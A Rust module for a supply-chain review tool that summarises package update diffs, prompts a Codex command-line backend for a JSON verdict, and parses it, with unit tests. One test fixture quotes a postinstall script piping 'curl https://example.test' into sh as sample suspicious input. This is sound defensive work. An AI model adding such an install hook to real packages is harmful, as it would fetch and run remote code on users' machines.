use std::error::Error;
use std::fmt;
use std::io;
use std::process::Command;

use serde::{Deserialize, Serialize};

use crate::config::ReviewProvider;
use crate::diff::{DiffSummary, SuspiciousExcerpt};
use crate::signals::Signal;

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum ReviewVerdict {
    Benign,
    Suspicious,
    #[default]
    NeedsReview,
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
#[serde(rename_all = "kebab-case")]
pub enum Confidence {
    #[default]
    Low,
    Medium,
    High,
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct ReviewSummary {
    pub files_added: usize,
    pub files_removed: usize,
    pub files_changed: usize,
    pub signals: Vec<String>,
}

impl ReviewSummary {
    pub fn from_diff_and_signals(diff: &DiffSummary, signals: &[Signal]) -> Self {
        Self {
            files_added: diff.files_added,
            files_removed: diff.files_removed,
            files_changed: diff.files_changed,
            signals: signals
                .iter()
                .copied()
                .map(Signal::as_str)
                .map(str::to_string)
                .collect(),
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct ReviewInput {
    pub ecosystem: String,
    pub package: String,
    pub old_version: String,
    pub new_version: String,
    pub summary: ReviewSummary,
    pub manifest_diff: Option<String>,
    pub interesting_files: Vec<SuspiciousExcerpt>,
}

#[derive(Debug, Clone)]
pub struct ReviewInputAnalysis {
    pub ecosystem: String,
    pub package: String,
    pub old_version: String,
    pub new_version: String,
    pub manifest_diff: Option<String>,
    pub interesting_files: Vec<SuspiciousExcerpt>,
}

impl ReviewInput {
    pub fn from_analysis(
        analysis: ReviewInputAnalysis,
        diff: &DiffSummary,
        signals: &[Signal],
    ) -> Self {
        Self {
            ecosystem: analysis.ecosystem,
            package: analysis.package,
            old_version: analysis.old_version,
            new_version: analysis.new_version,
            summary: ReviewSummary::from_diff_and_signals(diff, signals),
            manifest_diff: analysis.manifest_diff,
            interesting_files: analysis.interesting_files,
        }
    }

    pub fn to_json_pretty(&self) -> Result<String, ReviewSchemaError> {
        serde_json::to_string_pretty(self).map_err(ReviewSchemaError::Serialize)
    }
}

#[derive(Debug, Clone, PartialEq, Eq, Default, Serialize, Deserialize)]
pub struct ReviewOutput {
    pub verdict: ReviewVerdict,
    pub confidence: Confidence,
    pub reasons: Vec<String>,
    pub focus_files: Vec<String>,
}

impl ReviewOutput {
    pub fn from_json_str(input: &str) -> Result<Self, ReviewSchemaError> {
        let output = serde_json::from_str::<Self>(input).map_err(ReviewSchemaError::Deserialize)?;
        output.validate()?;
        Ok(output)
    }

    pub fn to_json_pretty(&self) -> Result<String, ReviewSchemaError> {
        serde_json::to_string_pretty(self).map_err(ReviewSchemaError::Serialize)
    }

    pub fn validate(&self) -> Result<(), ReviewSchemaError> {
        if self.reasons.iter().any(|reason| reason.trim().is_empty()) {
            return Err(ReviewSchemaError::Validation(
                "review reasons must not contain empty strings".to_string(),
            ));
        }

        if self
            .focus_files
            .iter()
            .any(|focus_file| focus_file.trim().is_empty())
        {
            return Err(ReviewSchemaError::Validation(
                "review focus_files must not contain empty strings".to_string(),
            ));
        }

        Ok(())
    }
}

pub trait Reviewer {
    fn review(&self, input: &ReviewInput) -> Result<ReviewOutput, ReviewBackendError>;
}

#[derive(Debug, Clone, Default)]
pub struct NoneReviewer;

impl Reviewer for NoneReviewer {
    fn review(&self, input: &ReviewInput) -> Result<ReviewOutput, ReviewBackendError> {
        let focus_files = input
            .interesting_files
            .iter()
            .map(|excerpt| excerpt.path.clone())
            .collect::<Vec<_>>();

        Ok(ReviewOutput {
            verdict: ReviewVerdict::NeedsReview,
            confidence: Confidence::Low,
            reasons: vec![
                "review backend is disabled (provider=none); manual review required".to_string(),
            ],
            focus_files,
        })
    }
}

#[derive(Debug, Clone, Default)]
pub struct CodexReviewer;

impl CodexReviewer {
    pub fn build_prompt(&self, input: &ReviewInput) -> Result<String, ReviewBackendError> {
        let payload = input.to_json_pretty().map_err(ReviewBackendError::Schema)?;

        Ok(format!(
            concat!(
                "You are reviewing a software package update for supply-chain risk.\n",
                "Return ONLY a JSON object with this exact schema:\n",
                "{\n",
                "  \"verdict\": \"benign\" | \"suspicious\" | \"needs-review\",\n",
                "  \"confidence\": \"low\" | \"medium\" | \"high\",\n",
                "  \"reasons\": string[],\n",
                "  \"focus_files\": string[]\n",
                "}\n",
                "Rules:\n",
                "- Output valid JSON only, no markdown, no prose outside JSON.\n",
                "- Keep reasons concise and evidence-based.\n",
                "- focus_files should reference paths from interesting_files when possible.\n",
                "- Use needs-review when uncertain.\n\n",
                "Review input JSON:\n{}\n"
            ),
            payload
        ))
    }

    pub fn parse_output(&self, output: &str) -> Result<ReviewOutput, ReviewBackendError> {
        let json = extract_json_object(output).ok_or_else(|| {
            ReviewBackendError::InvalidResponse(
                "codex output did not contain a JSON object".to_string(),
            )
        })?;

        ReviewOutput::from_json_str(&json).map_err(ReviewBackendError::Schema)
    }

    pub fn review_with_runner<R: CodexCommandRunner>(
        &self,
        input: &ReviewInput,
        runner: &R,
    ) -> Result<ReviewOutput, ReviewBackendError> {
        let prompt = self.build_prompt(input)?;
        let output = runner.run(&prompt)?;
        self.parse_output(&output)
    }
}

impl Reviewer for CodexReviewer {
    fn review(&self, input: &ReviewInput) -> Result<ReviewOutput, ReviewBackendError> {
        self.review_with_runner(input, &ProcessCodexRunner)
    }
}

pub trait CodexCommandRunner {
    fn run(&self, prompt: &str) -> Result<String, ReviewBackendError>;
}

#[derive(Debug, Clone, Copy, Default)]
pub struct ProcessCodexRunner;

impl CodexCommandRunner for ProcessCodexRunner {
    fn run(&self, prompt: &str) -> Result<String, ReviewBackendError> {
        let command = "codex exec <prompt>".to_string();
        let output = Command::new("codex")
            .arg("exec")
            .arg(prompt)
            .output()
            .map_err(|source| ReviewBackendError::CommandSpawn {
                command: command.clone(),
                source,
            })?;

        if !output.status.success() {
            return Err(ReviewBackendError::CommandFailed {
                command,
                status: output.status.code(),
                stderr: String::from_utf8_lossy(&output.stderr).trim().to_string(),
            });
        }

        let stdout = String::from_utf8_lossy(&output.stdout).trim().to_string();
        if stdout.is_empty() {
            return Err(ReviewBackendError::InvalidResponse(
                "codex returned an empty response".to_string(),
            ));
        }

        Ok(stdout)
    }
}

#[derive(Debug, Clone, Default)]
pub enum ReviewBackend {
    #[default]
    None(NoneReviewer),
    Codex(CodexReviewer),
}

impl ReviewBackend {
    pub fn from_provider(provider: ReviewProvider) -> Result<Self, ReviewBackendError> {
        match provider {
            ReviewProvider::None => Ok(Self::None(NoneReviewer)),
            ReviewProvider::Codex => Ok(Self::Codex(CodexReviewer)),
            ReviewProvider::ClaudeCode => Err(ReviewBackendError::UnsupportedProvider(provider)),
        }
    }

    pub fn review(&self, input: &ReviewInput) -> Result<ReviewOutput, ReviewBackendError> {
        match self {
            Self::None(reviewer) => reviewer.review(input),
            Self::Codex(reviewer) => reviewer.review(input),
        }
    }
}

#[derive(Debug)]
pub enum ReviewSchemaError {
    Serialize(serde_json::Error),
    Deserialize(serde_json::Error),
    Validation(String),
}

impl fmt::Display for ReviewSchemaError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Serialize(source) => {
                write!(f, "failed to serialize review schema json: {source}")
            }
            Self::Deserialize(source) => {
                write!(f, "failed to deserialize review schema json: {source}")
            }
            Self::Validation(message) => write!(f, "invalid review schema: {message}"),
        }
    }
}

impl Error for ReviewSchemaError {
    fn source(&self) -> Option<&(dyn Error + 'static)> {
        match self {
            Self::Serialize(source) | Self::Deserialize(source) => Some(source),
            Self::Validation(_) => None,
        }
    }
}

#[derive(Debug)]
pub enum ReviewBackendError {
    UnsupportedProvider(ReviewProvider),
    Schema(ReviewSchemaError),
    CommandSpawn {
        command: String,
        source: io::Error,
    },
    CommandFailed {
        command: String,
        status: Option<i32>,
        stderr: String,
    },
    InvalidResponse(String),
}

impl fmt::Display for ReviewBackendError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::UnsupportedProvider(provider) => write!(
                f,
                "review backend `{}` is not implemented yet",
                review_provider_label(provider)
            ),
            Self::Schema(source) => write!(f, "review backend schema error: {source}"),
            Self::CommandSpawn { command, source } => {
                write!(f, "failed to spawn `{command}`: {source}")
            }
            Self::CommandFailed {
                command,
                status,
                stderr,
            } => {
                if stderr.is_empty() {
                    write!(
                        f,
                        "`{command}` failed with exit status {}",
                        status.map_or_else(|| "unknown".to_string(), |code| code.to_string())
                    )
                } else {
                    write!(
                        f,
                        "`{command}` failed with exit status {}: {stderr}",
                        status.map_or_else(|| "unknown".to_string(), |code| code.to_string())
                    )
                }
            }
            Self::InvalidResponse(message) => {
                write!(f, "invalid review backend response: {message}")
            }
        }
    }
}

impl Error for ReviewBackendError {
    fn source(&self) -> Option<&(dyn Error + 'static)> {
        match self {
            Self::UnsupportedProvider(_)
            | Self::CommandFailed { .. }
            | Self::InvalidResponse(_) => None,
            Self::Schema(source) => Some(source),
            Self::CommandSpawn { source, .. } => Some(source),
        }
    }
}

fn review_provider_label(provider: &ReviewProvider) -> &'static str {
    match provider {
        ReviewProvider::None => "none",
        ReviewProvider::Codex => "codex",
        ReviewProvider::ClaudeCode => "claude-code",
    }
}

fn extract_json_object(text: &str) -> Option<String> {
    if let Ok(value) = serde_json::from_str::<serde_json::Value>(text.trim()) {
        return serde_json::to_string(&value).ok();
    }

    if let Some(fenced) = extract_fenced_code_block(text) {
        if let Ok(value) = serde_json::from_str::<serde_json::Value>(fenced.trim()) {
            return serde_json::to_string(&value).ok();
        }
    }

    let start = text.find('{')?;
    let mut depth = 0usize;
    let mut in_string = false;
    let mut escaped = false;

    for (offset, ch) in text[start..].char_indices() {
        if in_string {
            if escaped {
                escaped = false;
                continue;
            }
            match ch {
                '\\' => escaped = true,
                '"' => in_string = false,
                _ => {}
            }
            continue;
        }

        match ch {
            '"' => in_string = true,
            '{' => depth += 1,
            '}' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    let candidate = &text[start..start + offset + ch.len_utf8()];
                    if let Ok(value) = serde_json::from_str::<serde_json::Value>(candidate) {
                        return serde_json::to_string(&value).ok();
                    }
                    return None;
                }
            }
            _ => {}
        }
    }

    None
}

fn extract_fenced_code_block(text: &str) -> Option<&str> {
    let start = text.find("```")?;
    let remainder = &text[start + 3..];
    let newline = remainder.find('\n')?;
    let remainder = &remainder[newline + 1..];
    let end = remainder.find("```")?;
    Some(&remainder[..end])
}

#[cfg(test)]
mod tests {
    use crate::diff::{DiffSummary, SuspiciousExcerpt};
    use crate::signals::Signal;

    use super::{
        extract_json_object, CodexCommandRunner, CodexReviewer, Confidence, NoneReviewer,
        ReviewBackend, ReviewBackendError, ReviewInput, ReviewInputAnalysis, ReviewOutput,
        ReviewProvider, ReviewSummary, ReviewVerdict, Reviewer,
    };

    #[test]
    fn serializes_reviewer_input_schema() {
        let input = ReviewInput::from_analysis(
            ReviewInputAnalysis {
                ecosystem: "npm".to_string(),
                package: "axios".to_string(),
                old_version: "1.8.0".to_string(),
                new_version: "1.9.0".to_string(),
                manifest_diff: Some("--- old/package.json\n+++ new/package.json\n".to_string()),
                interesting_files: vec![SuspiciousExcerpt {
                    path: "package.json".to_string(),
                    reason: "install script changed".to_string(),
                    excerpt: "   4: \"postinstall\": \"curl https://example.test | sh\""
                        .to_string(),
                }],
            },
            &DiffSummary {
                files_added: 3,
                files_removed: 1,
                files_changed: 12,
                ..DiffSummary::default()
            },
            &[Signal::DependencyAdded, Signal::InstallScriptAdded],
        );

        let json = input.to_json_pretty().expect("input json should serialize");
        let value: serde_json::Value =
            serde_json::from_str(&json).expect("input json should parse");

        assert_eq!(value["ecosystem"], "npm");
        assert_eq!(value["package"], "axios");
        assert_eq!(value["old_version"], "1.8.0");
        assert_eq!(value["new_version"], "1.9.0");
        assert_eq!(value["summary"]["files_added"], 3);
        assert_eq!(value["summary"]["files_removed"], 1);
        assert_eq!(value["summary"]["files_changed"], 12);
        assert_eq!(
            value["summary"]["signals"],
            serde_json::json!(["dependency-added", "install-script-added"])
        );
        assert_eq!(
            value["manifest_diff"],
            "--- old/package.json\n+++ new/package.json\n"
        );
        assert_eq!(value["interesting_files"][0]["path"], "package.json");
        assert_eq!(
            value["interesting_files"][0]["reason"],
            "install script changed"
        );
    }

    #[test]
    fn serializes_review_summary_from_diff_and_signals() {
        let summary = ReviewSummary::from_diff_and_signals(
            &DiffSummary {
                files_added: 1,
                files_removed: 2,
                files_changed: 3,
                ..DiffSummary::default()
            },
            &[Signal::DependencyAdded, Signal::EntrypointChanged],
        );

        assert_eq!(summary.files_added, 1);
        assert_eq!(summary.files_removed, 2);
        assert_eq!(summary.files_changed, 3);
        assert_eq!(
            summary.signals,
            vec!["dependency-added", "entrypoint-changed"]
        );
    }

    #[test]
    fn parses_reviewer_output_schema() {
        let output = ReviewOutput::from_json_str(
            r#"{
              "verdict": "suspicious",
              "confidence": "high",
              "reasons": ["new install script"],
              "focus_files": ["package.json"]
            }"#,
        )
        .expect("output json should deserialize");

        assert_eq!(output.verdict, ReviewVerdict::Suspicious);
        assert_eq!(output.confidence, Confidence::High);
        assert_eq!(output.reasons, vec!["new install script"]);
        assert_eq!(output.focus_files, vec!["package.json"]);
    }

    #[test]
    fn rejects_invalid_reviewer_output_schema() {
        let error = ReviewOutput::from_json_str(
            r#"{
              "verdict": "needs-review",
              "confidence": "low",
              "reasons": [""],
              "focus_files": ["package.json"]
            }"#,
        )
        .expect_err("empty reason should fail validation");

        assert!(error
            .to_string()
            .contains("review reasons must not contain empty strings"));
    }

    #[test]
    fn serializes_reviewer_output_schema() {
        let output = ReviewOutput {
            verdict: ReviewVerdict::Benign,
            confidence: Confidence::Medium,
            reasons: vec!["no suspicious changes detected".to_string()],
            focus_files: vec!["README.md".to_string()],
        };

        let json = output
            .to_json_pretty()
            .expect("output json should serialize");
        let value: serde_json::Value =
            serde_json::from_str(&json).expect("output json should parse");

        assert_eq!(value["verdict"], "benign");
        assert_eq!(value["confidence"], "medium");
        assert_eq!(value["reasons"][0], "no suspicious changes detected");
        assert_eq!(value["focus_files"][0], "README.md");
    }

    #[test]
    fn none_reviewer_returns_manual_review_result() {
        let reviewer = NoneReviewer;
        let input = ReviewInput::from_analysis(
            ReviewInputAnalysis {
                ecosystem: "npm".to_string(),
                package: "axios".to_string(),
                old_version: "1.8.0".to_string(),
                new_version: "1.9.0".to_string(),
                manifest_diff: None,
                interesting_files: vec![SuspiciousExcerpt {
                    path: "package.json".to_string(),
                    reason: "install script changed".to_string(),
                    excerpt: "postinstall".to_string(),
                }],
            },
            &DiffSummary::default(),
            &[],
        );

        let output = reviewer
            .review(&input)
            .expect("none reviewer should succeed");

        assert_eq!(output.verdict, ReviewVerdict::NeedsReview);
        assert_eq!(output.confidence, Confidence::Low);
        assert_eq!(
            output.reasons,
            vec!["review backend is disabled (provider=none); manual review required"]
        );
        assert_eq!(output.focus_files, vec!["package.json"]);
    }

    #[test]
    fn codex_reviewer_builds_json_prompt() {
        let reviewer = CodexReviewer;
        let input = ReviewInput::from_analysis(
            ReviewInputAnalysis {
                ecosystem: "npm".to_string(),
                package: "axios".to_string(),
                old_version: "1.8.0".to_string(),
                new_version: "1.9.0".to_string(),
                manifest_diff: None,
                interesting_files: vec![SuspiciousExcerpt {
                    path: "package.json".to_string(),
                    reason: "install script changed".to_string(),
                    excerpt: "postinstall".to_string(),
                }],
            },
            &DiffSummary::default(),
            &[],
        );

        let prompt = reviewer.build_prompt(&input).expect("prompt should build");

        assert!(prompt.contains("Return ONLY a JSON object"));
        assert!(prompt.contains("\"package\": \"axios\""));
        assert!(prompt.contains("\"interesting_files\""));
    }

    #[test]
    fn codex_reviewer_accepts_plain_and_fenced_json() {
        let reviewer = CodexReviewer;

        let plain = reviewer
            .parse_output(
                r#"{"verdict":"suspicious","confidence":"high","reasons":["script changed"],"focus_files":["package.json"]}"#,
            )
            .expect("plain json should parse");
        assert_eq!(plain.verdict, ReviewVerdict::Suspicious);

        let fenced = reviewer
            .parse_output(
                "```json\n{\n  \"verdict\": \"needs-review\",\n  \"confidence\": \"low\",\n  \"reasons\": [\"uncertain\"],\n  \"focus_files\": [\"README.md\"]\n}\n```",
            )
            .expect("fenced json should parse");
        assert_eq!(fenced.verdict, ReviewVerdict::NeedsReview);
        assert_eq!(fenced.focus_files, vec!["README.md"]);
    }

    #[test]
    fn codex_reviewer_uses_runner_adapter() {
        let reviewer = CodexReviewer;
        let input = ReviewInput::default();
        let runner = FakeCodexRunner {
            output: Ok(
                r#"{"verdict":"benign","confidence":"medium","reasons":["looks normal"],"focus_files":[]}"#
                    .to_string(),
            ),
        };

        let output = reviewer
            .review_with_runner(&input, &runner)
            .expect("runner-backed review should succeed");

        assert_eq!(output.verdict, ReviewVerdict::Benign);
        assert_eq!(output.confidence, Confidence::Medium);
        assert_eq!(output.reasons, vec!["looks normal"]);
    }

    #[test]
    fn backend_factory_supports_none_and_codex_providers() {
        let none_backend = ReviewBackend::from_provider(ReviewProvider::None)
            .expect("none provider should be supported");
        let codex_backend = ReviewBackend::from_provider(ReviewProvider::Codex)
            .expect("codex provider should be supported");
        let input = ReviewInput::default();
        let none_output = none_backend
            .review(&input)
            .expect("none backend should review");

        assert_eq!(none_output.verdict, ReviewVerdict::NeedsReview);
        assert!(matches!(codex_backend, ReviewBackend::Codex(_)));
    }

    #[test]
    fn backend_factory_rejects_unimplemented_providers() {
        let claude_error = ReviewBackend::from_provider(ReviewProvider::ClaudeCode)
            .expect_err("claude backend should not be implemented yet");
        assert_eq!(
            claude_error.to_string(),
            "review backend `claude-code` is not implemented yet"
        );
    }

    #[test]
    fn extracts_json_object_from_mixed_text() {
        let extracted = extract_json_object(
            "analysis:\n```json\n{\n  \"verdict\": \"benign\",\n  \"confidence\": \"low\",\n  \"reasons\": [\"ok\"],\n  \"focus_files\": []\n}\n```",
        )
        .expect("json should be extracted");

        assert_eq!(
            extracted,
            r#"{"confidence":"low","focus_files":[],"reasons":["ok"],"verdict":"benign"}"#
        );
    }

    struct FakeCodexRunner {
        output: Result<String, ReviewBackendError>,
    }

    impl CodexCommandRunner for FakeCodexRunner {
        fn run(&self, _prompt: &str) -> Result<String, ReviewBackendError> {
            match &self.output {
                Ok(output) => Ok(output.clone()),
                Err(err) => Err(ReviewBackendError::InvalidResponse(err.to_string())),
            }
        }
    }
}
